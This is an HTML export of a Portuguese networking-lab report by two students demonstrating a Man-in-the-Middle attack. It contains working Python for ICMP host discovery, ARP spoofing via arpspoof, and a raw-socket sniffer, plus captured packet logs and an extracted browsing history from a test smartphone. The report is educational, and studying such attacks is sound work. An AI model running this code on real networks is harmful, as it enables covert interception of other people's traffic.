@@ -1,0 +1,683 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>relatorio.md</title>
+<meta http-equiv="Content-type" content="text/html;charset=UTF-8">
+
+<style>
+/* https://github.com/microsoft/vscode/blob/master/extensions/markdown-language-features/media/markdown.css */
+/*---------------------------------------------------------------------------------------------
+ *  Copyright (c) Microsoft Corporation. All rights reserved.
+ *  Licensed under the MIT License. See License.txt in the project root for license information.
+ *--------------------------------------------------------------------------------------------*/
+
+body {
+	font-family: var(--vscode-markdown-font-family, -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif);
+	font-size: var(--vscode-markdown-font-size, 14px);
+	padding: 0 26px;
+	line-height: var(--vscode-markdown-line-height, 22px);
+	word-wrap: break-word;
+}
+
+#code-csp-warning {
+	position: fixed;
+	top: 0;
+	right: 0;
+	color: white;
+	margin: 16px;
+	text-align: center;
+	font-size: 12px;
+	font-family: sans-serif;
+	background-color:#444444;
+	cursor: pointer;
+	padding: 6px;
+	box-shadow: 1px 1px 1px rgba(0,0,0,.25);
+}
+
+#code-csp-warning:hover {
+	text-decoration: none;
+	background-color:#007acc;
+	box-shadow: 2px 2px 2px rgba(0,0,0,.25);
+}
+
+body.scrollBeyondLastLine {
+	margin-bottom: calc(100vh - 22px);
+}
+
+body.showEditorSelection .code-line {
+	position: relative;
+}
+
+body.showEditorSelection .code-active-line:before,
+body.showEditorSelection .code-line:hover:before {
+	content: "";
+	display: block;
+	position: absolute;
+	top: 0;
+	left: -12px;
+	height: 100%;
+}
+
+body.showEditorSelection li.code-active-line:before,
+body.showEditorSelection li.code-line:hover:before {
+	left: -30px;
+}
+
+.vscode-light.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(0, 0, 0, 0.15);
+}
+
+.vscode-light.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(0, 0, 0, 0.40);
+}
+
+.vscode-light.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+.vscode-dark.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(255, 255, 255, 0.4);
+}
+
+.vscode-dark.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(255, 255, 255, 0.60);
+}
+
+.vscode-dark.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+.vscode-high-contrast.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(255, 160, 0, 0.7);
+}
+
+.vscode-high-contrast.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(255, 160, 0, 1);
+}
+
+.vscode-high-contrast.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+img {
+	max-width: 100%;
+	max-height: 100%;
+}
+
+a {
+	text-decoration: none;
+}
+
+a:hover {
+	text-decoration: underline;
+}
+
+a:focus,
+input:focus,
+select:focus,
+textarea:focus {
+	outline: 1px solid -webkit-focus-ring-color;
+	outline-offset: -1px;
+}
+
+hr {
+	border: 0;
+	height: 2px;
+	border-bottom: 2px solid;
+}
+
+h1 {
+	padding-bottom: 0.3em;
+	line-height: 1.2;
+	border-bottom-width: 1px;
+	border-bottom-style: solid;
+}
+
+h1, h2, h3 {
+	font-weight: normal;
+}
+
+table {
+	border-collapse: collapse;
+}
+
+table > thead > tr > th {
+	text-align: left;
+	border-bottom: 1px solid;
+}
+
+table > thead > tr > th,
+table > thead > tr > td,
+table > tbody > tr > th,
+table > tbody > tr > td {
+	padding: 5px 10px;
+}
+
+table > tbody > tr + tr > td {
+	border-top: 1px solid;
+}
+
+blockquote {
+	margin: 0 7px 0 5px;
+	padding: 0 16px 0 10px;
+	border-left-width: 5px;
+	border-left-style: solid;
+}
+
+code {
+	font-family: Menlo, Monaco, Consolas, "Droid Sans Mono", "Courier New", monospace, "Droid Sans Fallback";
+	font-size: 1em;
+	line-height: 1.357em;
+}
+
+body.wordWrap pre {
+	white-space: pre-wrap;
+}
+
+pre:not(.hljs),
+pre.hljs code > div {
+	padding: 16px;
+	border-radius: 3px;
+	overflow: auto;
+}
+
+pre code {
+	color: var(--vscode-editor-foreground);
+	tab-size: 4;
+}
+
+/** Theming */
+
+.vscode-light pre {
+	background-color: rgba(220, 220, 220, 0.4);
+}
+
+.vscode-dark pre {
+	background-color: rgba(10, 10, 10, 0.4);
+}
+
+.vscode-high-contrast pre {
+	background-color: rgb(0, 0, 0);
+}
+
+.vscode-high-contrast h1 {
+	border-color: rgb(0, 0, 0);
+}
+
+.vscode-light table > thead > tr > th {
+	border-color: rgba(0, 0, 0, 0.69);
+}
+
+.vscode-dark table > thead > tr > th {
+	border-color: rgba(255, 255, 255, 0.69);
+}
+
+.vscode-light h1,
+.vscode-light hr,
+.vscode-light table > tbody > tr + tr > td {
+	border-color: rgba(0, 0, 0, 0.18);
+}
+
+.vscode-dark h1,
+.vscode-dark hr,
+.vscode-dark table > tbody > tr + tr > td {
+	border-color: rgba(255, 255, 255, 0.18);
+}
+
+</style>
+
+<style>
+/* Tomorrow Theme */
+/* http://jmblog.github.com/color-themes-for-google-code-highlightjs */
+/* Original theme - https://github.com/chriskempson/tomorrow-theme */
+
+/* Tomorrow Comment */
+.hljs-comment,
+.hljs-quote {
+	color: #8e908c;
+}
+
+/* Tomorrow Red */
+.hljs-variable,
+.hljs-template-variable,
+.hljs-tag,
+.hljs-name,
+.hljs-selector-id,
+.hljs-selector-class,
+.hljs-regexp,
+.hljs-deletion {
+	color: #c82829;
+}
+
+/* Tomorrow Orange */
+.hljs-number,
+.hljs-built_in,
+.hljs-builtin-name,
+.hljs-literal,
+.hljs-type,
+.hljs-params,
+.hljs-meta,
+.hljs-link {
+	color: #f5871f;
+}
+
+/* Tomorrow Yellow */
+.hljs-attribute {
+	color: #eab700;
+}
+
+/* Tomorrow Green */
+.hljs-string,
+.hljs-symbol,
+.hljs-bullet,
+.hljs-addition {
+	color: #718c00;
+}
+
+/* Tomorrow Blue */
+.hljs-title,
+.hljs-section {
+	color: #4271ae;
+}
+
+/* Tomorrow Purple */
+.hljs-keyword,
+.hljs-selector-tag {
+	color: #8959a8;
+}
+
+.hljs {
+	display: block;
+	overflow-x: auto;
+	color: #4d4d4c;
+	padding: 0.5em;
+}
+
+.hljs-emphasis {
+	font-style: italic;
+}
+
+.hljs-strong {
+	font-weight: bold;
+}
+</style>
+
+<style>
+/*
+ * Markdown PDF CSS
+ */
+
+ body {
+	font-family: -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif, "Meiryo";
+	padding: 0 12px;
+}
+
+pre {
+	background-color: #f8f8f8;
+	border: 1px solid #cccccc;
+	border-radius: 3px;
+	overflow-x: auto;
+	white-space: pre-wrap;
+	overflow-wrap: break-word;
+}
+
+pre:not(.hljs) {
+	padding: 23px;
+	line-height: 19px;
+}
+
+blockquote {
+	background: rgba(127, 127, 127, 0.1);
+	border-color: rgba(0, 122, 204, 0.5);
+}
+
+.emoji {
+	height: 1.4em;
+}
+
+code {
+	font-size: 14px;
+	line-height: 19px;
+}
+
+/* for inline code */
+:not(pre):not(.hljs) > code {
+	color: #C9AE75; /* Change the old color so it seems less like an error */
+	font-size: inherit;
+}
+
+/* Page Break : use <div class="page"/> to insert page break
+-------------------------------------------------------- */
+.page {
+	page-break-after: always;
+}
+
+</style>
+
+<script src="https://unpkg.com/mermaid/dist/mermaid.min.js"></script>
+</head>
+<body>
+  <script>
+    mermaid.initialize({
+      startOnLoad: true,
+      theme: document.body.classList.contains('vscode-dark') || document.body.classList.contains('vscode-high-contrast')
+          ? 'dark'
+          : 'default'
+    });
+  </script>
+<h1 id="laborat%C3%B3rio-de-redes---trabalho-final">Laboratório de Redes - Trabalho Final</h1>
+<h2 id="rodrigo-oliveira-rosa">Rodrigo Oliveira Rosa</h2>
+<h2 id="lucas-figueira-lopes">Lucas Figueira Lopes</h2>
+<h3 id="sum%C3%A1rio">Sumário</h3>
+<ol>
+<li>Introdução</li>
+<li>Desenvolvimento
+<ul>
+<li>Explicação do ataque Man-in-the-Middle</li>
+<li>ARP Spoofing</li>
+<li>Monitoramento de Tráfego</li>
+</ul>
+</li>
+<li>Estrutura do Projeto</li>
+<li>Etapas do Projeto
+<ul>
+<li>Etapa 1: Descoberta de Hosts Ativos</li>
+<li>Etapa 2: Execução do ARP Spoofing</li>
+<li>Etapa 3: Monitoramento e Captura de Pacotes</li>
+</ul>
+</li>
+<li>Análise de Resultados</li>
+<li>Conclusão</li>
+</ol>
+<hr>
+<h3 id="introdu%C3%A7%C3%A3o">Introdução</h3>
+<p>O projeto final da disciplina foi desenvolvido para demonstrar um ataque do tipo <em>Man-in-the-Middle</em> (MITM). O ataque explora vulnerabilidades dos protocolos de rede, possibilitando a interceptação e modificação de tráfego entre um dispositivo alvo e o gateway da rede.</p>
+<p>Neste relatório, detalhamos os passos para realizar o ataque, desde a descoberta de hosts ativos na rede até a captura de pacotes utilizando sockets <em>raw</em>. Além disso, foram utilizadas técnicas como ARP Spoofing para redirecionar o tráfego e ferramentas de análise para examinar os dados interceptados.</p>
+<p>O objetivo principal do trabalho é evidenciar os riscos associados a redes inseguras e reforçar a importância de medidas de proteção, como o uso de criptografia em comunicações.</p>
+<hr>
+<h3 id="desenvolvimento">Desenvolvimento</h3>
+<h4 id="ataque-man-in-the-middle-mitm"><strong>Ataque Man-in-the-Middle (MITM)</strong></h4>
+<p>O MITM é um tipo de ataque onde um invasor se posiciona entre duas partes comunicantes, interceptando ou alterando as mensagens trocadas. Para este projeto, a interceptação ocorre em nível de rede local (LAN), explorando a vulnerabilidade no protocolo ARP.</p>
+<h4 id="arp-spoofing"><strong>ARP Spoofing</strong></h4>
+<p>O ARP Spoofing consiste em enviar mensagens ARP falsificadas, fazendo com que o alvo e o gateway associem o endereço MAC do atacante aos seus respectivos IPs. Assim, o tráfego passa pelo atacante antes de chegar ao destino.</p>
+<h4 id="monitoramento-de-tr%C3%A1fego"><strong>Monitoramento de Tráfego</strong></h4>
+<p>Após redirecionar o tráfego, um sniffer foi utilizado para capturar pacotes. Este processo envolveu a análise de cabeçalhos e extração de informações sensíveis, como URLs acessadas e consultas DNS.</p>
+<hr>
+<h3 id="estrutura-do-projeto">Estrutura do Projeto</h3>
+<p>A estrutura de arquivos foi organizada da seguinte forma:</p>
+<pre class="hljs"><code><div>├── analise.py
+├── arpspoof.py
+├── gerar_relatorio.py
+├── historico.html
+├── log_bruto.txt
+├── log_wireshark.pcapng
+├── main.py
+├── sniffer.py
+├── varredura.py
+└── relatorio_labredes.md
+</div></code></pre>
+<p>Cada módulo tem funções específicas, facilitando a manutenção e expansão do projeto.</p>
+<hr>
+<h3 id="etapas-do-projeto">Etapas do Projeto</h3>
+<h4 id="etapa-1-descoberta-de-hosts-ativos"><strong>Etapa 1: Descoberta de Hosts Ativos</strong></h4>
+<p>Nesta etapa, utilizamos pacotes ICMP (<em>pings</em>) para identificar dispositivos ativos na rede. A função <code>enviar_ping()</code> implementa pacotes ICMP personalizados, garantindo maior controle sobre o processo.</p>
+<p>icmp.py</p>
+<pre class="hljs"><code><div>import socket
+import struct
+import time
+import os
+
+<span class="hljs-comment"># Cria um pacote ICMP Echo Request.</span>
+def criar_pacote_icmp(seq):
+
+    id_icmp = os.getpid() &amp; 0xFFFF 
+    header = struct.pack(<span class="hljs-string">"bbHHh"</span>, 8, 0, 0, id_icmp, seq) 
+    checksum = calcular_checksum(header)
+    header = struct.pack(<span class="hljs-string">"bbHHh"</span>, 8, 0, checksum, id_icmp, seq)
+    <span class="hljs-built_in">return</span> header
+
+<span class="hljs-comment"># Calcula o checksum de um cabeçalho ICMP.</span>
+def calcular_checksum(header):
+
+    <span class="hljs-keyword">if</span> len(header) % 2:
+        header += b<span class="hljs-string">'\x00'</span>
+    checksum = sum(struct.unpack(<span class="hljs-string">"!%dH"</span> % (len(header) // 2), header))
+    checksum = (checksum &gt;&gt; 16) + (checksum &amp; 0xFFFF)
+    checksum += checksum &gt;&gt; 16
+    checksum = ~checksum &amp; 0xFFFF
+    <span class="hljs-built_in">return</span> socket.htons(checksum)
+
+<span class="hljs-comment"># Envia um pacote ICMP Echo Request para um host e retorna o tempo de resposta.</span>
+def enviar_ping(host, timeout):
+
+    try:
+        icmp = socket.IPPROTO_ICMP 
+        with socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp) as sock:
+            sock.settimeout(timeout / 1000)
+            seq = 1 
+            packet = criar_pacote_icmp(seq)
+            sock.sendto(packet, (host, 1))
+            start = time.time()
+
+            resposta, endereco = sock.recvfrom(1024)
+            tempo_resposta = (time.time() - start) * 1000 
+
+            tipo, codigo, checksum, id_icmp, seq_resposta = struct.unpack(<span class="hljs-string">"bbHHh"</span>, resposta[20:28])
+            <span class="hljs-keyword">if</span> tipo == 0 and id_icmp == (os.getpid() &amp; 0xFFFF) and seq_resposta == seq:
+                <span class="hljs-built_in">return</span> int(tempo_resposta) 
+            <span class="hljs-keyword">else</span>:
+                <span class="hljs-built_in">return</span> None
+    except socket.timeout:
+        <span class="hljs-built_in">return</span> None  
+    except PermissionError:
+        raise PermissionError(<span class="hljs-string">"Permissões de administrador são necessárias para enviar pacotes ICMP."</span>)
+    except Exception as e:
+        <span class="hljs-built_in">print</span>(f<span class="hljs-string">"Erro: {e}"</span>)
+        <span class="hljs-built_in">return</span> None
+</div></code></pre>
+<p>A seguir apresentamos a classe responsável por fazer a varredura, buscando os ips ativos na rede, afim de selecionarmos um alvo para o ataque.</p>
+<p>varredura.py</p>
+<pre class="hljs"><code><div>import ipaddress
+import time
+from icmp import enviar_ping
+from datetime import datetime
+
+<span class="hljs-comment"># Função para calcular os IPs válidos na rede, excluindo o endereço de rede e broadcast.</span>
+def calcular_intervalo_ips(rede):
+    <span class="hljs-string">""</span><span class="hljs-string">"Calcula os IPs válidos na rede, excluindo o endereço de rede e broadcast."</span><span class="hljs-string">""</span>
+    rede_obj = ipaddress.ip_network(rede, strict=False)
+    <span class="hljs-built_in">return</span> [str(ip) <span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> rede_obj.hosts()]
+
+<span class="hljs-comment"># Função para calcular o gateway (geralmente o primeiro IP válido da rede).</span>
+def calcular_gateway(rede):
+    <span class="hljs-string">""</span><span class="hljs-string">"Calcula o gateway (geralmente o primeiro IP válido da rede)."</span><span class="hljs-string">""</span>
+    rede_obj = ipaddress.ip_network(rede, strict=False)
+    <span class="hljs-built_in">return</span> str(list(rede_obj.hosts())[0])
+
+<span class="hljs-comment"># Função para executar a varredura na rede e identificar hosts ativos.</span>
+def executar_varredura(rede, timeout):
+    <span class="hljs-string">""</span><span class="hljs-string">"
+    Realiza a varredura na rede para identificar hosts ativos e calcula o tempo total de varredura.
+    "</span><span class="hljs-string">""</span>
+    <span class="hljs-built_in">print</span>(f<span class="hljs-string">"Iniciando varredura na rede {rede}..."</span>)
+    hosts_ativos = []
+    hosts = calcular_intervalo_ips(rede)
+
+    inicio_varredura = time.time()
+
+    <span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> hosts:
+        tempo_resposta = enviar_ping(ip, timeout)
+        <span class="hljs-keyword">if</span> tempo_resposta is not None:
+            hosts_ativos.append((ip, tempo_resposta))
+            <span class="hljs-built_in">print</span>(f<span class="hljs-string">"Host ativo: {ip} - Tempo de resposta: {tempo_resposta:.2f} ms"</span>)
+
+    fim_varredura = time.time()
+    tempo_total = fim_varredura - inicio_varredura
+
+    rede_obj = ipaddress.ip_network(rede, strict=False)
+    total_hosts = rede_obj.num_addresses - 2 
+
+    <span class="hljs-built_in">print</span>(f<span class="hljs-string">"\nNúmero de máquinas ativas: {len(hosts_ativos)}"</span>)
+    <span class="hljs-built_in">print</span>(f<span class="hljs-string">"Número total de máquinas na rede: {total_hosts}"</span>)
+    <span class="hljs-built_in">print</span>(f<span class="hljs-string">"Tempo total de varredura: {tempo_total:.2f} segundos"</span>)
+    <span class="hljs-built_in">print</span>(<span class="hljs-string">"\nLista de hosts ativos:"</span>)
+    <span class="hljs-keyword">for</span> ip, tempo <span class="hljs-keyword">in</span> hosts_ativos:
+        <span class="hljs-built_in">print</span>(f<span class="hljs-string">"IP: {ip} - Tempo de resposta: {tempo:.2f} ms"</span>)
+
+    <span class="hljs-built_in">return</span> hosts_ativos
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
+    rede = input(<span class="hljs-string">"Digite a rede no formato CIDR (ex.: 192.168.1.0/24): "</span>)
+    timeout = int(input(<span class="hljs-string">"Digite o tempo limite de resposta (em ms): "</span>))
+    try:
+        executar_varredura(rede, timeout)
+    except PermissionError:
+        <span class="hljs-built_in">print</span>(<span class="hljs-string">"Erro: É necessário executar este script como administrador (root)."</span>)
+    except ValueError as e:
+        <span class="hljs-built_in">print</span>(f<span class="hljs-string">"Erro de valor: {e}"</span>)
+    except Exception as e:
+        <span class="hljs-built_in">print</span>(f<span class="hljs-string">"Ocorreu um erro inesperado: {e}"</span>)
+</div></code></pre>
+<hr>
+<h4 id="etapa-2-execu%C3%A7%C3%A3o-do-arp-spoofing"><strong>Etapa 2: Execução do ARP Spoofing</strong></h4>
+<p>Com os hosts descobertos, realizamos o ARP Spoofing. A função <code>realizar_arp_spoofing()</code> manipula tabelas ARP do alvo e do gateway, garantindo o redirecionamento do tráfego para o atacante.</p>
+<p>arpspoof.py</p>
+<pre class="hljs"><code><div>import os
+import subprocess
+import time
+
+def habilitar_ip_forwarding():
+<span class="hljs-comment"># Habilita o IP forwarding para que o tráfego possa ser roteado através da máquina que está realizando o ARP Spoofing.</span>
+
+    with open(<span class="hljs-string">"/proc/sys/net/ipv4/ip_forward"</span>, <span class="hljs-string">"w"</span>) as f:
+        f.write(<span class="hljs-string">"1"</span>)
+
+def realizar_arp_spoofing(target_ip, gateway_ip, interface, stop_event):
+ <span class="hljs-comment"># Realiza o ARP Spoofing. A execução continuará até o `stop_event` ser sinalizado.</span>
+
+    try:
+        <span class="hljs-built_in">print</span>(f<span class="hljs-string">"Iniciando ARP Spoofing contra o alvo {target_ip} e o gateway {gateway_ip} na interface {interface}..."</span>)
+
+        habilitar_ip_forwarding()
+
+        <span class="hljs-keyword">while</span> not stop_event.is_set():
+            subprocess.run([<span class="hljs-string">"arpspoof"</span>, <span class="hljs-string">"-i"</span>, interface, <span class="hljs-string">"-t"</span>, target_ip, gateway_ip], check=True)
+            subprocess.run([<span class="hljs-string">"arpspoof"</span>, <span class="hljs-string">"-i"</span>, interface, <span class="hljs-string">"-t"</span>, gateway_ip, target_ip], check=True)
+            time.sleep(2) 
+
+    except subprocess.CalledProcessError as e:
+        <span class="hljs-built_in">print</span>(f<span class="hljs-string">"[ERRO] Comando arpspoof falhou: {e}"</span>)
+    except KeyboardInterrupt:
+        <span class="hljs-built_in">print</span>(<span class="hljs-string">"\nARP Spoofing interrompido pelo usuário."</span>)
+    finally:
+        <span class="hljs-built_in">print</span>(<span class="hljs-string">"ARP Spoofing interrompido e o processo de forwarding foi desabilitado."</span>)
+        with open(<span class="hljs-string">"/proc/sys/net/ipv4/ip_forward"</span>, <span class="hljs-string">"w"</span>) as f:
+            f.write(<span class="hljs-string">"0"</span>)
+</div></code></pre>
+<h4 id="etapa-3-monitoramento-e-captura-de-pacotes"><strong>Etapa 3: Monitoramento e Captura de Pacotes</strong></h4>
+<p>A função <code>start_sniffer()</code> intercepta pacotes DNS e HTTP, registrando-os em logs para análise. Cabeçalhos são decapsulados para extrair informações como URLs e consultas de domínio.</p>
+<p>sniffer.py</p>
+<pre class="hljs"><code><div>import socket
+import struct
+from datetime import datetime
+from analise import extrair_http, extrair_dns, salvar_historico
+
+<span class="hljs-comment"># Função para iniciar o sniffer de pacotes.</span>
+def start_sniffer(interface, stop_event):
+    <span class="hljs-string">""</span><span class="hljs-string">"
+    Inicia o sniffer para capturar pacotes DNS e HTTP/HTTPS.
+    "</span><span class="hljs-string">""</span>
+    sniffer_socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
+    sniffer_socket.bind((interface, 0))
+
+    <span class="hljs-built_in">print</span>(<span class="hljs-string">"Capturando pacotes DNS/HTTP..."</span>)
+
+    <span class="hljs-keyword">while</span> not stop_event.is_set(): 
+        try:
+            packet = sniffer_socket.recv(2048)
+
+            with open(<span class="hljs-string">"log_bruto.txt"</span>, <span class="hljs-string">"a"</span>) as log_file:
+                log_file.write(f<span class="hljs-string">"{datetime.now()} - Pacote Capturado: {packet.hex()}\n"</span>) 
+
+            eth_header = packet[:14]
+            eth = struct.unpack(<span class="hljs-string">"!6s6sH"</span>, eth_header)
+            eth_protocol = socket.ntohs(eth[2])
+
+            <span class="hljs-keyword">if</span> eth_protocol == 8: 
+                ip_header = packet[14:34]
+                iph = struct.unpack(<span class="hljs-string">"!BBHHHBBH4s4s"</span>, ip_header)
+                ip_protocol = iph[6]
+                source_ip = socket.inet_ntoa(iph[8])
+                destination_ip = socket.inet_ntoa(iph[9])
+
+                <span class="hljs-keyword">if</span> ip_protocol == 17:
+                    dns_query = extrair_dns(packet)
+                    <span class="hljs-keyword">if</span> dns_query:
+                        salvar_historico(source_ip, dns_query)
+
+                <span class="hljs-keyword">elif</span> ip_protocol == 6:
+                    result = extrair_http(packet)
+                    <span class="hljs-keyword">if</span> result:
+                        url, ip_src, ip_dst = result
+                        salvar_historico(source_ip, url)
+
+        except KeyboardInterrupt:
+            <span class="hljs-built_in">print</span>(<span class="hljs-string">"\nSniffer interrompido pelo usuário."</span>)
+            <span class="hljs-built_in">break</span>
+        except Exception as e:
+            <span class="hljs-built_in">print</span>(f<span class="hljs-string">"[ERRO] Ocorreu um erro ao processar o pacote: {e}"</span>)
+            <span class="hljs-built_in">break</span>
+
+    sniffer_socket.close()
+    <span class="hljs-built_in">print</span>(<span class="hljs-string">"Captura de pacotes finalizada."</span>)
+
+</div></code></pre>
+<hr>
+<h3 id="an%C3%A1lise-de-resultados">Análise de Resultados</h3>
+<p>Para o ambiente de testes, utilizamos uma rede local com o atacante usando um pc de mesa e o alvo um smartphone conectado ao wi-fi da rede interna.</p>
+<p>A seguir temos a tela do atacante, com o processo de captura em andamento:
+<img src="../imagens/Captura de tela de 2024-11-25 11-07-39.png" alt="atacante"></p>
+<p>Em paralelo rodamos o programa Wireshark, para poder monitorar em tempo de execução e demonstrar que conseguimos com êxito desviar o tráfego entre o smartphone e o modem.
+<img src="../imagens/Captura de tela de 2024-11-25 11-13-05.png" alt="wireshark"></p>
+<p>A maior dificuldade, concretizada infelizmente não na totalidade devido a problemas com regex, foi a filtragem e geração do arquivo html. Como quase todo o tráfego é seguro (https), não é possível rastrear corretamente os endereços acessados a partir do device.</p>
+<p>Os logs capturados mostraram a interceptação de consultas DNS e requisições HTTP. Foram identificados dados sensíveis, como URLs visitadas, demonstrando a eficácia do ataque.</p>
+<ul>
+<li><strong>Log Bruto:</strong> Contém os pacotes capturados no formato hexadecimal.</li>
+</ul>
+<pre class="hljs"><code><div>(...)
+2024-11-26 13:38:02.685334 - Pacote Capturado: 00e04c6822cb1c3bf35f5bcc0800450000d27f5b00003c118ac1a8e4080ac0a802680035a9e600be3ddaf8f581800001000300000001066d6f62696c65066576656e74730464617461096d6963726f736f667403636f6d0000010001c00c000500010000003f0027066d6f62696c65066576656e747304646174610e747261666669636d616e61676572036e657400c03e000500010000002b002a106f6e656473636f6c707264756b73303307756b736f75746808636c6f756461707005617a757265c029c07100010001000000070004336947890000290200000000000000
+2024-11-26 13:38:02.687325 - Pacote Capturado: 00e04c6822cb1c3bf35f5bcc0800450000fe7f5c00003c118a94a8e4080ac0a80268003595e800eab50e143e81800001000200010001066d6f62696c65066576656e74730464617461096d6963726f736f667403636f6d0000410001c00c000500010000003f0027066d6f62696c65066576656e747304646174610e747261666669636d616e61676572036e657400c03e000500010000002b002a106f6e656473636f6c707264756b73303307756b736f75746808636c6f756461707005617a757265c029c082000600010000002a0030066e73312d303109617a7572652d646e73c029066d736e687374c01f00000001000003840000012c00093a800000003c0000290200000000000000
+2024-11-26 13:38:02.691575 - Pacote Capturado: 00e04c6822cb1c3bf35f5bcc0800450000aa7f5d00003c118ae7a8e4080ac0a802680035cf5200966557ac0181800001000000010001106f6e656473636f6c707264756b73303307756b736f75746808636c6f756461707005617a75726503636f6d0000410001c01d000600010000002a003a066e73312d303109617a7572652d646e73c034066d736e687374096d6963726f736f6674c03400000001000003840000012c00093a800000003c0000290200000000000000
+(...)
+</div></code></pre>
+<ul>
+<li><strong>Histórico:</strong> Informações analisadas foram formatadas em um relatório HTML acessível.</li>
+</ul>
+<pre class="hljs"><code><div><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">header</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Histórico de Navegação<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">header</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>26/11/2024 23:26 - 192.168.2.102 - <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"b-apifacebook.com"</span>&gt;</span>b-apifacebookcom<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">header</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Histórico de Navegação<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">header</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>26/11/2024 23:26 - 192.168.2.102 - <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"b-graphfacebook.com"</span>&gt;</span>b-graphfacebookcom<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">header</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Histórico de Navegação<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">header</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>26/11/2024 23:26 - 192.168.2.102 - <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"play.googleapis.com"</span>&gt;</span>playgoogleapiscom<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">header</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Histórico de Navegação<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">header</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>26/11/2024 23:26 - 192.168.2.102 - <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"google-ohttp-relay-safebrowsingfastly-edgecom"</span>&gt;</span>google-ohttp-relay-safebrowsingfastly-edgecom<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
